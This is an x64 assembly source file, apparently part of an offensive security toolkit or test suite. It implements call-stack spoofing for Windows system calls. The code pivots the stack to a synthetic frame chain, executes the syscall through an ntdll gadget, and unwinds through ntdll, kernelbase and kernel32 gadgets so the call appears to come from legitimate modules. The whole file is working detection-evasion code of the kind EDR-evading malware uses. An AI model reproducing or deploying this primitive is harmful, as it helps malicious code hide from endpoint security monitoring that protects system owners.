# bm_spoof_asm.s — BM-T2005: Spoofed Syscall Dispatch (Stack Pivot)
# GAS (GNU Assembler) x64 — Intel syntax
#
# Provides the core assembly primitive for call stack spoofing:
#   bm_spoof_execute(DWORD ssn, int argc, void **argv)
#
# Flow:
#   1. Save non-volatile registers (RBX, RBP, RSI, RDI, R12-R15)
#   2. Save real RSP to global
#   3. Load SSN into EAX, args into R10/RDX/R8/R9
#   4. Load RBX = restore trampoline address
#   5. Pivot RSP to synthetic stack (pre-built by C code)
#   6. JMP to syscall;ret gadget (Stargate indirect)
#   7. syscall executes → ret → gadget chain unwinds:
#      ntdll gadget → kernelbase gadget → kernel32 gadget → jmp rbx
#   8. jmp rbx lands at restore trampoline
#   9. Restore real RSP, pop saved registers, return NTSTATUS in EAX
#
# The synthetic stack is populated by build_synth_frames() in bm_spoof.c
# BEFORE this function is called. It contains:
#   - The spoofed frame chain (gadget addresses + padding)
#   - Stack arguments for args 5-11 at the correct offsets
#
# Thread Safety: Uses global g_spoof_real_rsp. Single-threaded only (v1).

.intel_syntax noprefix

# =====================================================================
# Global State (.data section)
# =====================================================================

.data

# Saved real RSP / synthetic RSP — defined in bm_spoof.c (RIP-relative).
.extern g_spoof_real_rsp
.extern g_spoof_synth_rsp
.extern g_syscall_gadget

# =====================================================================
# Spoofed Dispatch (.text section)
# =====================================================================

.text

# bm_spoof_execute(DWORD ssn, int argc, void **argv)
#   RCX = ssn (syscall service number)
#   EDX = argc (number of arguments, 0-11)
#   R8  = argv (pointer to void* array of arguments)
#
# Returns: NTSTATUS in EAX (from the syscall)

.globl bm_spoof_execute
bm_spoof_execute:
    # ---- Save non-volatile registers ----
    # Windows x64 ABI: RBX, RBP, RDI, RSI, R12-R15 are callee-saved.
    # The kernel preserves these across syscall, so they survive the
    # entire pivot + syscall + gadget chain + restore sequence.
    push rbx
    push rbp
    push rsi
    push rdi
    push r12
    push r13
    push r14
    push r15

    # ---- Save real RSP ----
    mov qword ptr [rip + g_spoof_real_rsp], rsp

    # ---- Save arguments to non-volatile registers ----
    mov r12d, ecx          # r12d = SSN
    mov r13d, edx          # r13d = argc
    mov r14, r8            # r14  = argv

    # ---- Load RBX = restore trampoline ----
    # RBX is non-volatile: preserved by the kernel across syscall,
    # and preserved by the gadget chain (add rsp, N; ret doesn't touch RBX).
    # The final jmp rbx gadget transfers control here.
    lea rbx, [rip + .Lspoof_restore]

    # ---- Load EAX = SSN ----
    mov eax, r12d

    # ---- Load syscall arguments from argv into registers ----
    # Windows syscall convention:
    #   R10 = arg1, RDX = arg2, R8 = arg3, R9 = arg4
    #   Stack args (5+) are already on the synthetic stack

    cmp r13d, 1
    jl .Lspoof_pivot
    mov r10, qword ptr [r14]           # arg1 -> R10

    cmp r13d, 2
    jl .Lspoof_pivot
    mov rdx, qword ptr [r14 + 8]      # arg2 -> RDX

    cmp r13d, 3
    jl .Lspoof_pivot
    mov r8, qword ptr [r14 + 16]      # arg3 -> R8

    cmp r13d, 4
    jl .Lspoof_pivot
    mov r9, qword ptr [r14 + 24]      # arg4 -> R9

    # Args 5-11 are placed on the synthetic stack at offsets 0x28-0x58
    # by build_synth_frames() in C — no need to copy them here.

.Lspoof_pivot:
    # ---- Pivot RSP to synthetic stack ----
    # The synthetic stack has the complete frame chain + stack args.
    # g_spoof_synth_rsp was set by build_synth_frames() before we got here.
    mov rsp, qword ptr [rip + g_spoof_synth_rsp]

    # ---- Execute syscall via indirect gadget ----
    # JMP to the syscall;ret gadget in ntdll (set by SG_SET_GADGET).
    # The gadget executes: syscall; ret
    #   - syscall: enters kernel, EAX=SSN, args in R10/RDX/R8/R9/stack
    #   - ret: pops [RSP] → first frame gadget (ntdll)
    #
    # From there, the gadget chain unwinds:
    #   gadget1 (ntdll):      add rsp, N1; ret → gadget2
    #   gadget2 (kernelbase): add rsp, N2; ret → gadget3
    #   gadget3 (kernel32):   add rsp, N3; ret → jmp_rbx gadget
    #   jmp_rbx (kernel32):   jmp rbx → .Lspoof_restore
    jmp qword ptr [rip + g_syscall_gadget]

    # ---- Restore Trampoline ----
    # Reached via: jmp rbx (final gadget in the chain)
    # RBX was loaded with this address before the pivot.
    # EAX still contains the NTSTATUS from the syscall.
.Lspoof_restore:
    # Restore real RSP (points to our saved non-volatile registers)
    mov rsp, qword ptr [rip + g_spoof_real_rsp]

    # Pop non-volatile registers (reverse order)
    pop r15
    pop r14
    pop r13
    pop r12
    pop rdi
    pop rsi
    pop rbp
    pop rbx

    # Return NTSTATUS (already in EAX)
    ret
